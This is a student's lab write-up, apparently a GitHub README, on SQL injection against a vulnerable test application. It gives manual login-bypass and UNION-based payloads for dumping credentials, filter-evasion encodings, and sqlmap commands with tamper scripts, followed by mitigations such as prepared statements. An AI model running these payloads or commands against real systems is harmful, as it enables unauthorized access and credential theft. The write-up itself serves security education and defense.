# 💉 SQL Injection Attack & Analysis Lab

![Security](https://img.shields.io/badge/Security-SQL%20Injection-red)
![Tools](https://img.shields.io/badge/Tools-SQLMap%20%7C%20Manual%20Payloads%20%7C%20DVWA-blue)
![Level](https://img.shields.io/badge/Difficulty-Medium-orange)
![Status](https://img.shields.io/badge/Status-Completed-green)
![Environment](https://img.shields.io/badge/Environment-Isolated%20Lab-yellow)

> ⚠️ **Disclaimer:** All SQL injection testing was performed on a **personally controlled vulnerable web application** in an isolated lab environment for **educational purposes only**. Performing SQL injection on systems you do not own or have explicit permission to test is illegal. This research is intended solely to understand web application vulnerabilities and improve security awareness.

---

## 📌 Table of Contents
- [Objective](#-objective)
- [Lab Environment Setup](#-lab-environment-setup)
- [Tools Used](#-tools-used)
- [What is SQL Injection?](#-what-is-sql-injection)
- [Methodology](#-methodology)
- [Phase 1 — Manual SQL Injection](#-phase-1--manual-sql-injection)
- [Phase 2 — Automated SQLMap Attack](#-phase-2--automated-sqlmap-attack)
- [Key Findings](#-key-findings)
- [Attack Results Summary](#-attack-results-summary)
- [Mitigation Recommendations](#-mitigation-recommendations)
- [Lessons Learned](#-lessons-learned)
- [References](#-references)

---

## 🎯 Objective

The goal of this project was to perform **SQL Injection attacks** on a vulnerable web application to understand how attackers exploit database vulnerabilities. The focus areas were:

- Bypassing **login authentication** using SQL injection payloads
- Extracting **database and table names** through manual enumeration
- Dumping **user credentials and sensitive data**
- Automating the attack using **SQLMap**
- Understanding how to **defend against SQL injection**

---

## 🖥️ Lab Environment Setup

| Component | Details |
|---|---|
| **Attacker Machine** | Kali Linux |
| **Target Application** | Vulnerable web application (personally controlled) |
| **Security Level Tested** | Medium (basic input filters applied) |
| **Database** | MySQL (backend) |
| **Environment** | Fully isolated — no real user data involved |

---

## 🛠️ Tools Used

| Tool | Purpose |
|---|---|
| **Manual Payloads** | Hand-crafted SQL injection strings |
| **SQLMap** | Automated SQL injection and database dumping |
| **Browser / Burp Suite** | Intercepting and modifying HTTP requests |
| **Kali Linux** | Attack environment |

---

## 🔑 What is SQL Injection?

SQL Injection occurs when **unsanitized user input is directly included in a database query**, allowing attackers to manipulate the query logic.

### Normal Login Query:
```sql
SELECT * FROM users WHERE username='admin' AND password='pass123';
```

### Injected Query (Login Bypass):
```sql
SELECT * FROM users WHERE username='admin'-- ' AND password='anything';
-- The -- comments out the password check → login bypassed!
```

### Types of SQL Injection Tested:

| Type | Description |
|---|---|
| **Classic / In-band** | Results returned directly in the response |
| **Error-based** | Database errors reveal structure information |
| **UNION-based** | Extra SELECT injected to extract data |
| **Boolean-based Blind** | True/false responses reveal data indirectly |

---

## 📋 Methodology

```
1. Identify Injection Point
        ↓
2. Test for Vulnerability (basic payload)
        ↓
3. Manual Injection — Login Bypass
        ↓
4. Manual Injection — Database Enumeration
        ↓
5. Manual Injection — Data Extraction
        ↓
6. Automated Attack with SQLMap
        ↓
7. Analysis & Documentation
```

---

## 🔬 Phase 1 — Manual SQL Injection

### Step 1 — Identify Injection Point
- Located input fields (login form, search box, URL parameters)
- Tested with a single quote `'` to trigger a database error
- Error confirmed the input was being passed directly to SQL query

```
Input: admin'
Response: You have an error in your SQL syntax...
→ Injection point confirmed!
```

### Step 2 — Login Bypass
Tested classic authentication bypass payloads on the login form:

```sql
-- Payload 1: Basic bypass
Username: admin'--
Password: anything

-- Payload 2: Always-true condition
Username: ' OR '1'='1'--
Password: anything

-- Payload 3: Comment out rest of query
Username: admin'/*
Password: anything
```

**Result:** Successfully bypassed login and gained access without valid credentials.

---

### Step 3 — Database Enumeration (UNION-based)

#### Find number of columns:
```sql
' ORDER BY 1--    → No error
' ORDER BY 2--    → No error
' ORDER BY 3--    → Error!
→ Table has 2 columns
```

#### Find visible columns:
```sql
' UNION SELECT NULL, NULL--
' UNION SELECT 1, 2--
→ Column positions 1 and 2 are visible in response
```

#### Extract database name:
```sql
' UNION SELECT database(), NULL--
→ Result: dvwa (or target db name)
```

#### Extract table names:
```sql
' UNION SELECT table_name, NULL 
  FROM information_schema.tables 
  WHERE table_schema=database()--
→ Result: users, guestbook
```

#### Extract column names:
```sql
' UNION SELECT column_name, NULL 
  FROM information_schema.columns 
  WHERE table_name='users'--
→ Result: user_id, username, password, email
```

#### Dump user data:
```sql
' UNION SELECT username, password FROM users--
→ Result: admin : 5f4dcc3b5aa765d61d8327deb882cf99 (MD5 hash)
```

---

### Step 4 — Bypassing Medium Security Filters
At medium security level, basic string filters were applied. Bypass techniques used:

```sql
-- Double encoding
%27 instead of '

-- Case variation
SeLeCt instead of SELECT

-- Comment variations
/*!UNION*/ /*!SELECT*/ 1,2--

-- URL encoding
%55NION %53ELECT
```

---

## 🤖 Phase 2 — Automated SQLMap Attack

### Step 1 — Basic SQLMap Scan
```bash
sqlmap -u "http://target/vulnerable.php?id=1" --dbs
# -u    : target URL with injectable parameter
# --dbs : enumerate all databases
```

### Step 2 — Extract Tables
```bash
sqlmap -u "http://target/vulnerable.php?id=1" -D dvwa --tables
# -D : specify database name
# --tables : list all tables
```

### Step 3 — Dump User Data
```bash
sqlmap -u "http://target/vulnerable.php?id=1" -D dvwa -T users --dump
# -T      : specify table name
# --dump  : dump all data from table
```

### Step 4 — Login Form Attack
```bash
sqlmap -u "http://target/login.php" \
  --data="username=admin&password=test" \
  --level=3 --risk=2 \
  --dbs
# --data  : POST parameters
# --level : test thoroughness (1-5)
# --risk  : risk of payloads (1-3)
```

### Step 5 — Bypass Medium Security with Tamper Scripts
```bash
sqlmap -u "http://target/vulnerable.php?id=1" \
  --tamper=space2comment,between \
  --dbs
# --tamper : scripts to bypass WAF/filters
```

---

## 🔍 Key Findings

### Finding 1 — Login Authentication Completely Bypassed
- Classic `' OR '1'='1'--` payload bypassed login without any valid credentials
- Medium security filters were insufficient — bypass achieved with encoded payloads
- Authentication is meaningless without **parameterized queries**

### Finding 2 — Full Database Structure Exposed
- UNION-based injection revealed all table names and column structures
- `information_schema` accessible — complete database map obtained
- Attacker can fully map the database with just one injectable parameter

### Finding 3 — User Credentials Dumped
- All usernames and password hashes extracted from the users table
- MD5 hashes found — easily crackable (MD5 is not safe for password storage)
- Demonstrates why **bcrypt / Argon2** must be used for password hashing

### Finding 4 — SQLMap Automated Everything in Minutes
- SQLMap completed full database enumeration in under 5 minutes
- Tamper scripts successfully bypassed medium-level filters
- Manual understanding + automation = complete attack chain

---

## 📊 Attack Results Summary

| Attack | Method | Result |
|---|---|---|
| Login Bypass | Manual payload | ✅ Success |
| DB Name Extraction | UNION-based | ✅ Success |
| Table Enumeration | UNION-based | ✅ Success |
| User Data Dump | UNION-based + SQLMap | ✅ Success |
| Medium Filter Bypass | Encoding + Tamper scripts | ✅ Success |

---

## 🛡️ Mitigation Recommendations

| Vulnerability | Recommendation |
|---|---|
| Unsanitized input | Use **parameterized queries / prepared statements** |
| Login bypass | Never build queries with string concatenation |
| Weak password hashing | Replace MD5 with **bcrypt or Argon2** |
| Database info exposed | Restrict `information_schema` access |
| No WAF | Implement a Web Application Firewall |
| Verbose error messages | Disable detailed SQL errors in production |
| Over-privileged DB user | Use least-privilege DB accounts for the app |

### ✅ Secure Code Example (Java / Spring Boot)
```java
// VULNERABLE — never do this
String query = "SELECT * FROM users WHERE username='" + username + "'";

// SECURE — always use prepared statements
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE username = ?"
);
stmt.setString(1, username);
```

---

## 📚 Lessons Learned

- SQL Injection is one of the most critical web vulnerabilities — **#1 in OWASP Top 10**
- Medium-level security filters are easily bypassed with encoding and tamper scripts
- **Parameterized queries** are the only real fix — input sanitization alone is not enough
- MD5 password hashing is dangerously weak — always use modern hashing algorithms
- SQLMap automates what takes hours manually — defenders must assume attackers use it
- This knowledge directly applies to building **secure backends in Spring Boot / FastAPI**

---

## 📖 References

- [OWASP SQL Injection Guide](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQLMap Official Documentation](https://sqlmap.org/)
- [PortSwigger SQL Injection Labs](https://portswigger.net/web-security/sql-injection)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [DVWA Official](https://dvwa.co.uk/)

---

## 🔗 Related Projects
- 🖥️ [Endpoint Vulnerability Analysis](https://github.com/Prasennadd/Endpoint-Vulnerability-Analysis)
- 📡 [WiFi Security & Hash Cracking](https://github.com/Prasennadd/WiFi-Security-And-Hash-Cracking)
- 🔍 [Network Scanning — Nmap](https://github.com/Prasennadd/Network-Scanning-Nmap)

---

## 👨‍💻 Author

**Manova Prasenna Raj D**
ECE Student | Sathyabama Institute of Science and Technology, Chennai
🔗 [LinkedIn](https://linkedin.com/in/prasenna-raj/) | 🐙 [GitHub](https://github.com/Prasennadd) | 📧 prasennadraj@gmail.com

---

*This project was conducted solely for educational and research purposes on a personally controlled vulnerable web application in an isolated environment.*
